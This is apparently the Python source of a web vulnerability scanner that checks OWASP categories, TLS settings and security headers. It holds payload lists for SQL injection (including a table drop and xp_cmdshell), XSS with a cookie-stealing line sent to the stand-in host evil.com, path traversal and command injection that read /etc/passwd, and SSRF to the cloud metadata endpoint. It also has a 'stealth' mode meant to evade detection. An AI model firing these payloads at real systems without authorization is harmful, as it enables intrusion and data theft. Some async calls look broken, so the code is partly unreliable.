#!/usr/bin/env python3
"""
CyberSec Assistant Portable - Web Vulnerability Scanner V1.0
Phase 4.2: OWASP Top 10 & Advanced Web Security Scanner
Architecture: FastAPI + OWASP Scanner + Stealth Integration
"""

import os
import json
import sqlite3
import asyncio
import logging
import requests
import re
import ssl
import socket
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any
from pathlib import Path
from urllib.parse import urljoin, urlparse, parse_qs
from dataclasses import dataclass, asdict
import hashlib
import time
import random
from bs4 import BeautifulSoup
import urllib3

# Import existing modules for integration
from stealth_engine import get_global_stealth_engine
from database_manager import get_database_manager

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logger = logging.getLogger(__name__)

@dataclass
class WebVulnerability:
    """Web vulnerability data structure"""
    vuln_id: str
    vulnerability_type: str
    severity: str
    title: str
    description: str
    url: str
    method: str
    parameter: str
    payload: str
    evidence: str
    risk_score: float
    cwe_id: Optional[str] = None
    owasp_category: Optional[str] = None
    remediation: List[str] = None

@dataclass
class WebScanResult:
    """Web scan result data structure"""
    scan_id: str
    target_url: str
    scan_type: str
    status: str
    start_time: datetime
    end_time: Optional[datetime] = None
    vulnerabilities: List[WebVulnerability] = None
    total_vulnerabilities: int = 0
    critical_count: int = 0
    high_count: int = 0
    medium_count: int = 0
    low_count: int = 0
    pages_scanned: int = 0
    forms_found: int = 0
    ssl_grade: Optional[str] = None

class OWASPScanner:
    """OWASP Top 10 vulnerability scanner"""
    
    def __init__(self, stealth_engine):
        self.stealth_engine = stealth_engine
        self.session = None
        
        # OWASP Top 10 2021 categories
        self.owasp_categories = {
            "A01:2021": "Broken Access Control",
            "A02:2021": "Cryptographic Failures", 
            "A03:2021": "Injection",
            "A04:2021": "Insecure Design",
            "A05:2021": "Security Misconfiguration",
            "A06:2021": "Vulnerable and Outdated Components",
            "A07:2021": "Identification and Authentication Failures",
            "A08:2021": "Software and Data Integrity Failures",
            "A09:2021": "Security Logging and Monitoring Failures",
            "A10:2021": "Server-Side Request Forgery (SSRF)"
        }
        
        # SQL Injection payloads
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "\" OR \"1\"=\"1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' AND (SELECT COUNT(*) FROM sysobjects)>0--",
            "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "' WAITFOR DELAY '00:00:05'--",
            "'; EXEC xp_cmdshell('ping 127.0.0.1')--"
        ]
        
        # XSS payloads
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "<script>document.location='http://evil.com/steal.php?c='+document.cookie</script>",
            "<body onload=alert('XSS')>"
        ]
        
        # Directory traversal payloads
        self.lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/var/log/apache2/access.log",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "file:///etc/passwd"
        ]
        
        # Command injection payloads
        self.cmd_payloads = [
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd", 
            "; ls -la",
            "| whoami",
            "&& whoami",
            "; ping -c 1 127.0.0.1",
            "| ping -c 1 127.0.0.1",
            "&& ping -c 1 127.0.0.1"
        ]
        
        # SSRF payloads
        self.ssrf_payloads = [
            "http://127.0.0.1:22",
            "http://localhost:3306",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:25",
            "http://[::1]:22",
            "http://2130706433:22",
            "http://017700000001:22"
        ]
    
    async def initialize_session(self):
        """Initialize stealth session for scanning"""
        self.session = self.stealth_engine.create_stealth_session()
        
        # Configure session for web scanning
        self.session.verify = False  # Disable SSL verification for testing
        self.session.timeout = 10
        self.session.max_redirects = 5
        
        # Add common headers
        self.session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
    
    async def scan_sql_injection(self, url: str, forms: List[Dict]) -> List[WebVulnerability]:
        """Scan for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        try:
            for form in forms:
                form_action = urljoin(url, form.get('action', ''))
                method = form.get('method', 'GET').upper()
                inputs = form.get('inputs', [])
                
                for payload in self.sql_payloads:
                    try:
                        # Test each input field
                        for input_field in inputs:
                            field_name = input_field.get('name', '')
                            if not field_name:
                                continue
                            
                            # Prepare test data
                            data = {}
                            for inp in inputs:
                                inp_name = inp.get('name', '')
                                if inp_name == field_name:
                                    data[inp_name] = payload
                                else:
                                    data[inp_name] = 'test'
                            
                            # Add stealth delay
                            await asyncio.sleep(random.uniform(1, 3))
                            
                            # Send request
                            if method == 'POST':
                                response = await self.session.post(form_action, data=data)
                            else:
                                response = await self.session.get(form_action, params=data)
                            
                            # Check for SQL error indicators
                            if self._detect_sql_error(response.text):
                                vulnerability = WebVulnerability(
                                    vuln_id=f"sql_{hashlib.md5(f'{form_action}{field_name}{payload}'.encode()).hexdigest()[:8]}",
                                    vulnerability_type="SQL Injection",
                                    severity="HIGH",
                                    title=f"SQL Injection in {field_name} parameter",
                                    description=f"SQL injection vulnerability detected in form parameter '{field_name}'",
                                    url=form_action,
                                    method=method,
                                    parameter=field_name,
                                    payload=payload,
                                    evidence=response.text[:500] if response.text else "",
                                    risk_score=8.5,
                                    cwe_id="CWE-89",
                                    owasp_category="A03:2021",
                                    remediation=[
                                        "Use parameterized queries/prepared statements",
                                        "Implement input validation and sanitization",
                                        "Use stored procedures with proper parameter handling",
                                        "Apply principle of least privilege to database accounts",
                                        "Enable database query logging and monitoring"
                                    ]
                                )
                                vulnerabilities.append(vulnerability)
                                logger.info(f"ðŸ” SQL Injection found: {form_action} - {field_name}")
                            
                    except Exception as e:
                        logger.debug(f"SQL injection test failed: {e}")
                        continue
                        
        except Exception as e:
            logger.error(f"âŒ SQL injection scan failed: {e}")
        
        return vulnerabilities
    
    def _detect_sql_error(self, response_text: str) -> bool:
        """Detect SQL errors in response"""
        sql_errors = [
            "sql syntax", "mysql_fetch", "ora-", "microsoft jet database",
            "sqlite_master", "postgresql", "warning: pg_", "valid postgresql result",
            "warning: mysql_", "mysqlclient", "microsoft access driver",
            "jdbc:sqlserver", "odbc sql server driver", "sqlstate"
        ]
        
        response_lower = response_text.lower()
        return any(error in response_lower for error in sql_errors)
    
    async def scan_xss(self, url: str, forms: List[Dict]) -> List[WebVulnerability]:
        """Scan for Cross-Site Scripting vulnerabilities"""
        vulnerabilities = []
        
        try:
            for form in forms:
                form_action = urljoin(url, form.get('action', ''))
                method = form.get('method', 'GET').upper()
                inputs = form.get('inputs', [])
                
                for payload in self.xss_payloads:
                    try:
                        # Test each input field
                        for input_field in inputs:
                            field_name = input_field.get('name', '')
                            input_type = input_field.get('type', 'text').lower()
                            
                            # Skip certain input types
                            if input_type in ['password', 'hidden', 'submit', 'button']:
                                continue
                            
                            if not field_name:
                                continue
                            
                            # Prepare test data
                            data = {}
                            for inp in inputs:
                                inp_name = inp.get('name', '')
                                if inp_name == field_name:
                                    data[inp_name] = payload
                                else:
                                    data[inp_name] = 'test'
                            
                            # Add stealth delay
                            await asyncio.sleep(random.uniform(1, 2))
                            
                            # Send request
                            if method == 'POST':
                                response = await self.session.post(form_action, data=data)
                            else:
                                response = await self.session.get(form_action, params=data)
                            
                            # Check if payload is reflected in response
                            if payload in response.text:
                                # Check if it's actually executable (not encoded)
                                if self._is_xss_exploitable(response.text, payload):
                                    severity = "HIGH" if "script" in payload.lower() else "MEDIUM"
                                    
                                    vulnerability = WebVulnerability(
                                        vuln_id=f"xss_{hashlib.md5(f'{form_action}{field_name}{payload}'.encode()).hexdigest()[:8]}",
                                        vulnerability_type="Cross-Site Scripting (XSS)",
                                        severity=severity,
                                        title=f"XSS vulnerability in {field_name} parameter",
                                        description=f"Cross-site scripting vulnerability detected in form parameter '{field_name}'",
                                        url=form_action,
                                        method=method,
                                        parameter=field_name,
                                        payload=payload,
                                        evidence=response.text[:500] if response.text else "",
                                        risk_score=7.5 if severity == "HIGH" else 6.0,
                                        cwe_id="CWE-79",
                                        owasp_category="A03:2021",
                                        remediation=[
                                            "Implement proper input validation and output encoding",
                                            "Use Content Security Policy (CSP) headers",
                                            "Sanitize user input on both client and server side",
                                            "Use HTTP-only and Secure flags for cookies",
                                            "Implement proper escaping based on output context"
                                        ]
                                    )
                                    vulnerabilities.append(vulnerability)
                                    logger.info(f"ðŸ” XSS found: {form_action} - {field_name}")
                            
                    except Exception as e:
                        logger.debug(f"XSS test failed: {e}")
                        continue
                        
        except Exception as e:
            logger.error(f"âŒ XSS scan failed: {e}")
        
        return vulnerabilities
    
    def _is_xss_exploitable(self, response_text: str, payload: str) -> bool:
        """Check if XSS payload is actually exploitable"""
        # Simple check - in real scenarios, this would be more sophisticated
        dangerous_tags = ['<script', '<iframe', '<img', '<svg', '<body', 'javascript:']
        payload_lower = payload.lower()
        
        return any(tag in payload_lower for tag in dangerous_tags) and payload in response_text
    
    async def scan_directory_traversal(self, url: str) -> List[WebVulnerability]:
        """Scan for directory traversal/LFI vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Parse URL to find potential file parameters
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            file_params = []
            for param, values in query_params.items():
                param_lower = param.lower()
                if any(keyword in param_lower for keyword in ['file', 'path', 'page', 'include', 'doc', 'template']):
                    file_params.append(param)
            
            # Test each file parameter
            for param in file_params:
                for payload in self.lfi_payloads:
                    try:
                        # Modify URL with payload
                        test_params = query_params.copy()
                        test_params[param] = [payload]
                        
                        # Construct test URL
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                        params_str = "&".join([f"{k}={v[0]}" for k, v in test_params.items()])
                        test_url += f"?{params_str}"
                        
                        # Add stealth delay
                        await asyncio.sleep(random.uniform(1, 2))
                        
                        # Send request
                        response = await self.session.get(test_url)
                        
                        # Check for file content indicators
                        if self._detect_file_disclosure(response.text, payload):
                            vulnerability = WebVulnerability(
                                vuln_id=f"lfi_{hashlib.md5(f'{test_url}{param}{payload}'.encode()).hexdigest()[:8]}",
                                vulnerability_type="Directory Traversal/LFI",
                                severity="HIGH",
                                title=f"Directory traversal in {param} parameter",
                                description=f"Local file inclusion vulnerability detected in parameter '{param}'",
                                url=test_url,
                                method="GET",
                                parameter=param,
                                payload=payload,
                                evidence=response.text[:500] if response.text else "",
                                risk_score=8.0,
                                cwe_id="CWE-22",
                                owasp_category="A01:2021",
                                remediation=[
                                    "Implement strict input validation and whitelisting",
                                    "Use absolute paths instead of relative paths",
                                    "Implement proper access controls",
                                    "Sanitize file paths and remove directory traversal sequences",
                                    "Use a security framework for file operations"
                                ]
                            )
                            vulnerabilities.append(vulnerability)
                            logger.info(f"ðŸ” LFI found: {test_url} - {param}")
                    
                    except Exception as e:
                        logger.debug(f"LFI test failed: {e}")
                        continue
                        
        except Exception as e:
            logger.error(f"âŒ Directory traversal scan failed: {e}")
        
        return vulnerabilities
    
    def _detect_file_disclosure(self, response_text: str, payload: str) -> bool:
        """Detect file disclosure in response"""
        # Linux/Unix file indicators
        if "etc/passwd" in payload.lower():
            return "root:" in response_text and "/bin/" in response_text
        
        # Windows file indicators  
        if "system32" in payload.lower():
            return "# Copyright" in response_text or "localhost" in response_text
        
        # Log file indicators
        if "log" in payload.lower():
            return any(indicator in response_text for indicator in [
                "GET /", "POST /", "HTTP/1.1", "[error]", "[notice]"
            ])
        
        return False
    
    async def scan_ssl_tls(self, url: str) -> List[WebVulnerability]:
        """Scan SSL/TLS configuration"""
        vulnerabilities = []
        
        try:
            parsed_url = urlparse(url)
            if parsed_url.scheme != 'https':
                return vulnerabilities
            
            hostname = parsed_url.hostname
            port = parsed_url.port or 443
            
            # Test SSL/TLS configuration
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    protocol = ssock.version()
                    
                    # Check for weak protocols
                    if protocol in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                        vulnerability = WebVulnerability(
                            vuln_id=f"ssl_weak_protocol_{hashlib.md5(f'{hostname}{protocol}'.encode()).hexdigest()[:8]}",
                            vulnerability_type="Weak SSL/TLS Protocol",
                            severity="HIGH",
                            title=f"Weak SSL/TLS protocol: {protocol}",
                            description=f"Server supports weak SSL/TLS protocol {protocol}",
                            url=url,
                            method="SSL/TLS",
                            parameter="protocol",
                            payload=protocol,
                            evidence=f"SSL/TLS Protocol: {protocol}",
                            risk_score=8.0,
                            cwe_id="CWE-326",
                            owasp_category="A02:2021",
                            remediation=[
                                "Disable SSLv2, SSLv3, TLSv1.0, and TLSv1.1",
                                "Use only TLS 1.2 and TLS 1.3",
                                "Configure strong cipher suites",
                                "Implement HTTP Strict Transport Security (HSTS)",
                                "Use Perfect Forward Secrecy (PFS)"
                            ]
                        )
                        vulnerabilities.append(vulnerability)
                    
                    # Check for weak ciphers
                    if cipher and len(cipher) >= 3:
                        cipher_name = cipher[0]
                        if any(weak in cipher_name for weak in ['RC4', 'DES', 'MD5', 'NULL']):
                            vulnerability = WebVulnerability(
                                vuln_id=f"ssl_weak_cipher_{hashlib.md5(f'{hostname}{cipher_name}'.encode()).hexdigest()[:8]}",
                                vulnerability_type="Weak SSL/TLS Cipher",
                                severity="MEDIUM",
                                title=f"Weak SSL/TLS cipher: {cipher_name}",
                                description=f"Server uses weak cipher suite {cipher_name}",
                                url=url,
                                method="SSL/TLS",
                                parameter="cipher",
                                payload=cipher_name,
                                evidence=f"Cipher Suite: {cipher_name}",
                                risk_score=6.0,
                                cwe_id="CWE-327",
                                owasp_category="A02:2021",
                                remediation=[
                                    "Disable weak cipher suites",
                                    "Use strong encryption algorithms (AES)",
                                    "Implement Perfect Forward Secrecy",
                                    "Regular security assessment of cipher suites"
                                ]
                            )
                            vulnerabilities.append(vulnerability)
                    
                    # Check certificate validity
                    if cert:
                        not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                        days_until_expiry = (not_after - datetime.now()).days
                        
                        if days_until_expiry < 30:
                            severity = "HIGH" if days_until_expiry < 7 else "MEDIUM"
                            vulnerability = WebVulnerability(
                                vuln_id=f"ssl_cert_expiry_{hashlib.md5(f'{hostname}{days_until_expiry}'.encode()).hexdigest()[:8]}",
                                vulnerability_type="SSL Certificate Expiring",
                                severity=severity,
                                title="SSL certificate expiring soon",
                                description=f"SSL certificate expires in {days_until_expiry} days",
                                url=url,
                                method="SSL/TLS",
                                parameter="certificate",
                                payload=str(days_until_expiry),
                                evidence=f"Certificate expires: {cert['notAfter']}",
                                risk_score=7.0 if severity == "HIGH" else 5.0,
                                cwe_id="CWE-295",
                                owasp_category="A02:2021",
                                remediation=[
                                    "Renew SSL certificate before expiration",
                                    "Implement certificate monitoring",
                                    "Use automated certificate renewal",
                                    "Set up alerts for certificate expiration"
                                ]
                            )
                            vulnerabilities.append(vulnerability)
        
        except Exception as e:
            logger.debug(f"SSL/TLS scan failed: {e}")
        
        return vulnerabilities
    
    async def scan_security_headers(self, url: str) -> List[WebVulnerability]:
        """Scan for missing security headers"""
        vulnerabilities = []
        
        try:
            response = await self.session.get(url)
            headers = response.headers
            
            # Define required security headers
            security_headers = {
                'X-Frame-Options': {
                    'severity': 'MEDIUM',
                    'description': 'Prevents clickjacking attacks',
                    'remediation': 'Add X-Frame-Options: DENY or SAMEORIGIN'
                },
                'X-Content-Type-Options': {
                    'severity': 'MEDIUM', 
                    'description': 'Prevents MIME-type confusion attacks',
                    'remediation': 'Add X-Content-Type-Options: nosniff'
                },
                'X-XSS-Protection': {
                    'severity': 'LOW',
                    'description': 'Enables XSS filtering in browsers',
                    'remediation': 'Add X-XSS-Protection: 1; mode=block'
                },
                'Strict-Transport-Security': {
                    'severity': 'HIGH',
                    'description': 'Enforces HTTPS connections',
                    'remediation': 'Add Strict-Transport-Security header'
                },
                'Content-Security-Policy': {
                    'severity': 'HIGH',
                    'description': 'Prevents XSS and data injection attacks',
                    'remediation': 'Implement proper Content-Security-Policy'
                },
                'Referrer-Policy': {
                    'severity': 'LOW',
                    'description': 'Controls referrer information',
                    'remediation': 'Add Referrer-Policy header'
                },
                'Feature-Policy': {
                    'severity': 'LOW',
                    'description': 'Controls browser features',
                    'remediation': 'Add Feature-Policy header'
                }
            }
            
            # Check for missing headers
            for header_name, header_info in security_headers.items():
                if header_name not in headers:
                    risk_scores = {'HIGH': 7.0, 'MEDIUM': 5.0, 'LOW': 3.0}
                    
                    vulnerability = WebVulnerability(
                        vuln_id=f"header_{header_name.lower().replace('-', '_')}_{hashlib.md5(f'{url}{header_name}'.encode()).hexdigest()[:8]}",
                        vulnerability_type="Missing Security Header",
                        severity=header_info['severity'],
                        title=f"Missing {header_name} header",
                        description=f"Security header {header_name} is missing. {header_info['description']}",
                        url=url,
                        method="GET",
                        parameter="headers",
                        payload=header_name,
                        evidence=f"Missing header: {header_name}",
                        risk_score=risk_scores[header_info['severity']],
                        cwe_id="CWE-16",
                        owasp_category="A05:2021",
                        remediation=[header_info['remediation']]
                    )
                    vulnerabilities.append(vulnerability)
            
        except Exception as e:
            logger.error(f"âŒ Security headers scan failed: {e}")
        
        return vulnerabilities

class WebVulnerabilityScanner:
    """Main web vulnerability scanner class"""
    
    def __init__(self, database_path: str):
        self.db_path = database_path
        self.db_manager = get_database_manager(database_path)
        self.stealth_engine = get_global_stealth_engine()
        self.owasp_scanner = OWASPScanner(self.stealth_engine)
        self._active_scans = {}
        self._init_web_tables()
    
    def _init_web_tables(self):
        """Initialize web vulnerability database tables"""
        try:
            with self.db_manager.get_connection() as conn:
                cursor = conn.cursor()
                
                # Web vulnerability scans table
                cursor.execute("""
                    CREATE TABLE IF NOT EXISTS web_vulnerability_scans (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        scan_id TEXT UNIQUE NOT NULL,
                        target_url TEXT NOT NULL,
                        scan_type TEXT NOT NULL,
                        status TEXT NOT NULL,
                        start_time TIMESTAMP,
                        end_time TIMESTAMP,
                        total_vulnerabilities INTEGER DEFAULT 0,
                        critical_count INTEGER DEFAULT 0,
                        high_count INTEGER DEFAULT 0,
                        medium_count INTEGER DEFAULT 0,
                        low_count INTEGER DEFAULT 0,
                        pages_scanned INTEGER DEFAULT 0,
                        forms_found INTEGER DEFAULT 0,
                        ssl_grade TEXT,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    )
                """)
                
                # Web vulnerabilities table
                cursor.execute("""
                    CREATE TABLE IF NOT EXISTS web_vulnerabilities (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        scan_id TEXT NOT NULL,
                        vuln_id TEXT UNIQUE NOT NULL,
                        vulnerability_type TEXT NOT NULL,
                        severity TEXT NOT NULL,
                        title TEXT NOT NULL,
                        description TEXT,
                        url TEXT NOT NULL,
                        method TEXT,
                        parameter TEXT,
                        payload TEXT,
                        evidence TEXT,
                        risk_score REAL,
                        cwe_id TEXT,
                        owasp_category TEXT,
                        remediation TEXT,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        FOREIGN KEY (scan_id) REFERENCES web_vulnerability_scans(scan_id)
                    )
                """)
                
                conn.commit()
                logger.info("âœ… Web vulnerability scanner tables initialized successfully")
                
        except Exception as e:
            logger.error(f"âŒ Failed to initialize web vulnerability tables: {e}")
            raise
    
    async def start_web_scan(self, target_url: str, scan_type: str = "comprehensive") -> str:
        """Start a web vulnerability scan"""
        try:
            scan_id = f"webscan_{int(datetime.now().timestamp())}"
            
            scan_result = WebScanResult(
                scan_id=scan_id,
                target_url=target_url,
                scan_type=scan_type,
                status="running",
                start_time=datetime.now()
            )
            
            self._active_scans[scan_id] = scan_result
            
            # Store scan in database
            with self.db_manager.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute("""
                    INSERT INTO web_vulnerability_scans 
                    (scan_id, target_url, scan_type, status, start_time)
                    VALUES (?, ?, ?, ?, ?)
                """, (scan_id, target_url, scan_type, "running", scan_result.start_time.isoformat()))
                conn.commit()
            
            # Start scan in background
            asyncio.create_task(self._execute_web_scan(scan_id))
            
            logger.info(f"ðŸš€ Started web vulnerability scan {scan_id} for target {target_url}")
            return scan_id
            
        except Exception as e:
            logger.error(f"âŒ Failed to start web vulnerability scan: {e}")
            raise
    
    async def _execute_web_scan(self, scan_id: str) -> None:
        """Execute the web vulnerability scan"""
        try:
            scan = self._active_scans[scan_id]
            scan.status = "scanning"
            
            # Initialize stealth session
            await self.owasp_scanner.initialize_session()
            
            # Discover forms and links
            forms = await self._discover_forms(scan.target_url)
            scan.forms_found = len(forms)
            
            all_vulnerabilities = []
            
            # OWASP Top 10 scans based on scan type
            if scan.scan_type in ['comprehensive', 'owasp']:
                # SQL Injection scan
                logger.info(f"ðŸ” Running SQL injection scan on {scan.target_url}")
                sql_vulns = await self.owasp_scanner.scan_sql_injection(scan.target_url, forms)
                all_vulnerabilities.extend(sql_vulns)
                
                # XSS scan
                logger.info(f"ðŸ” Running XSS scan on {scan.target_url}")
                xss_vulns = await self.owasp_scanner.scan_xss(scan.target_url, forms)
                all_vulnerabilities.extend(xss_vulns)
                
                # Directory traversal scan
                logger.info(f"ðŸ” Running directory traversal scan on {scan.target_url}")
                lfi_vulns = await self.owasp_scanner.scan_directory_traversal(scan.target_url)
                all_vulnerabilities.extend(lfi_vulns)
            
            # SSL/TLS scan
            if scan.scan_type in ['comprehensive', 'ssl']:
                logger.info(f"ðŸ” Running SSL/TLS scan on {scan.target_url}")
                ssl_vulns = await self.owasp_scanner.scan_ssl_tls(scan.target_url)
                all_vulnerabilities.extend(ssl_vulns)
            
            # Security headers scan
            if scan.scan_type in ['comprehensive', 'headers']:
                logger.info(f"ðŸ” Running security headers scan on {scan.target_url}")
                header_vulns = await self.owasp_scanner.scan_security_headers(scan.target_url)
                all_vulnerabilities.extend(header_vulns)
            
            # Process scan results
            scan.vulnerabilities = all_vulnerabilities
            scan.total_vulnerabilities = len(all_vulnerabilities)
            scan.pages_scanned = 1  # Simple implementation
            
            # Count by severity
            for vuln in all_vulnerabilities:
                if vuln.severity == "CRITICAL":
                    scan.critical_count += 1
                elif vuln.severity == "HIGH":
                    scan.high_count += 1
                elif vuln.severity == "MEDIUM":
                    scan.medium_count += 1
                else:
                    scan.low_count += 1
            
            scan.status = "completed"
            scan.end_time = datetime.now()
            
            # Save results to database
            await self._save_web_scan_results(scan)
            
            logger.info(f"âœ… Web vulnerability scan {scan_id} completed. Found {scan.total_vulnerabilities} vulnerabilities")
            
        except Exception as e:
            logger.error(f"âŒ Web vulnerability scan {scan_id} failed: {e}")
            if scan_id in self._active_scans:
                self._active_scans[scan_id].status = "failed"
    
    async def _discover_forms(self, url: str) -> List[Dict]:
        """Discover forms on the target page"""
        forms = []
        
        try:
            response = await self.owasp_scanner.session.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET'),
                    'inputs': []
                }
                
                # Find all input fields
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_data = {
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    }
                    form_data['inputs'].append(input_data)
                
                forms.append(form_data)
            
        except Exception as e:
            logger.debug(f"Form discovery failed: {e}")
        
        return forms
    
    async def _save_web_scan_results(self, scan: WebScanResult) -> None:
        """Save web scan results to database"""
        try:
            with self.db_manager.get_connection() as conn:
                cursor = conn.cursor()
                
                # Update scan record
                cursor.execute("""
                    UPDATE web_vulnerability_scans 
                    SET status = ?, end_time = ?, total_vulnerabilities = ?,
                        critical_count = ?, high_count = ?, medium_count = ?, low_count = ?,
                        pages_scanned = ?, forms_found = ?, ssl_grade = ?,
                        updated_at = CURRENT_TIMESTAMP
                    WHERE scan_id = ?
                """, (
                    scan.status, scan.end_time.isoformat() if scan.end_time else None,
                    scan.total_vulnerabilities, scan.critical_count, scan.high_count,
                    scan.medium_count, scan.low_count, scan.pages_scanned,
                    scan.forms_found, scan.ssl_grade, scan.scan_id
                ))
                
                # Save vulnerabilities
                if scan.vulnerabilities:
                    for vuln in scan.vulnerabilities:
                        cursor.execute("""
                            INSERT INTO web_vulnerabilities
                            (scan_id, vuln_id, vulnerability_type, severity, title, description,
                             url, method, parameter, payload, evidence, risk_score, cwe_id,
                             owasp_category, remediation)
                            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                        """, (
                            scan.scan_id, vuln.vuln_id, vuln.vulnerability_type,
                            vuln.severity, vuln.title, vuln.description, vuln.url,
                            vuln.method, vuln.parameter, vuln.payload, vuln.evidence,
                            vuln.risk_score, vuln.cwe_id, vuln.owasp_category,
                            json.dumps(vuln.remediation or [])
                        ))
                
                conn.commit()
                
        except Exception as e:
            logger.error(f"âŒ Failed to save web scan results: {e}")
    
    def get_scan_status(self, scan_id: str) -> Dict[str, Any]:
        """Get web scan status and results"""
        try:
            if scan_id in self._active_scans:
                scan = self._active_scans[scan_id]
                return {
                    "scan_id": scan_id,
                    "target_url": scan.target_url,
                    "status": scan.status,
                    "start_time": scan.start_time.isoformat(),
                    "end_time": scan.end_time.isoformat() if scan.end_time else None,
                    "total_vulnerabilities": scan.total_vulnerabilities,
                    "critical_count": scan.critical_count,
                    "high_count": scan.high_count,
                    "medium_count": scan.medium_count,
                    "low_count": scan.low_count,
                    "pages_scanned": scan.pages_scanned,
                    "forms_found": scan.forms_found,
                    "ssl_grade": scan.ssl_grade
                }
            
            # Check database for completed scans
            with self.db_manager.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT scan_id, target_url, scan_type, status, start_time, end_time,
                           total_vulnerabilities, critical_count, high_count, medium_count, low_count,
                           pages_scanned, forms_found, ssl_grade
                    FROM web_vulnerability_scans
                    WHERE scan_id = ?
                """, (scan_id,))
                
                result = cursor.fetchone()
                if result:
                    return {
                        "scan_id": result[0],
                        "target_url": result[1],
                        "scan_type": result[2],
                        "status": result[3],
                        "start_time": result[4],
                        "end_time": result[5],
                        "total_vulnerabilities": result[6] or 0,
                        "critical_count": result[7] or 0,
                        "high_count": result[8] or 0,
                        "medium_count": result[9] or 0,
                        "low_count": result[10] or 0,
                        "pages_scanned": result[11] or 0,
                        "forms_found": result[12] or 0,
                        "ssl_grade": result[13]
                    }
            
            return {"error": "Scan not found"}
            
        except Exception as e:
            logger.error(f"âŒ Failed to get web scan status: {e}")
            return {"error": str(e)}
    
    def get_web_vulnerabilities(self, scan_id: str) -> List[Dict]:
        """Get detailed web vulnerabilities for a scan"""
        try:
            with self.db_manager.get_connection() as conn:
                cursor = conn.cursor()
                
                cursor.execute("""
                    SELECT vuln_id, vulnerability_type, severity, title, description,
                           url, method, parameter, payload, evidence, risk_score,
                           cwe_id, owasp_category, remediation
                    FROM web_vulnerabilities
                    WHERE scan_id = ?
                    ORDER BY risk_score DESC, severity DESC
                """, (scan_id,))
                
                results = cursor.fetchall()
                
                vulnerabilities = []
                for row in results:
                    vuln = {
                        "vuln_id": row[0],
                        "vulnerability_type": row[1],
                        "severity": row[2],
                        "title": row[3],
                        "description": row[4],
                        "url": row[5],
                        "method": row[6],
                        "parameter": row[7],
                        "payload": row[8],
                        "evidence": row[9],
                        "risk_score": row[10],
                        "cwe_id": row[11],
                        "owasp_category": row[12],
                        "remediation": json.loads(row[13]) if row[13] else []
                    }
                    vulnerabilities.append(vuln)
                
                return vulnerabilities
                
        except Exception as e:
            logger.error(f"âŒ Failed to get web vulnerabilities: {e}")
            return []

# Global instance
_web_vulnerability_scanner = None

def get_web_vulnerability_scanner(database_path: str = None) -> WebVulnerabilityScanner:
    """Get global web vulnerability scanner instance"""
    global _web_vulnerability_scanner
    
    if _web_vulnerability_scanner is None:
        if not database_path:
            # Use default path from main application
            from pathlib import Path
            portable_dir = Path(__file__).parent.parent.absolute()
            database_path = str(portable_dir / "data" / "cybersec.db")
        
        _web_vulnerability_scanner = WebVulnerabilityScanner(database_path)
    
    return _web_vulnerability_scanner

if __name__ == "__main__":
    # Test the web vulnerability scanner
    async def test_scanner():
        scanner = get_web_vulnerability_scanner()
        
        # Start a web scan
        target_url = "http://testphp.vulnweb.com/"  # Test site
        scan_id = await scanner.start_web_scan(target_url, "comprehensive")
        print(f"Started web scan: {scan_id}")
        
        # Wait for scan to complete
        await asyncio.sleep(30)
        
        # Get scan status
        status = scanner.get_scan_status(scan_id)
        print(f"Scan status: {status}")
        
        if status.get("status") == "completed":
            # Get vulnerabilities
            vulns = scanner.get_web_vulnerabilities(scan_id)
            print(f"Found {len(vulns)} web vulnerabilities")
            
            for vuln in vulns[:5]:  # Show first 5
                print(f"- {vuln['severity']}: {vuln['title']} ({vuln['vulnerability_type']})")
    
    asyncio.run(test_scanner())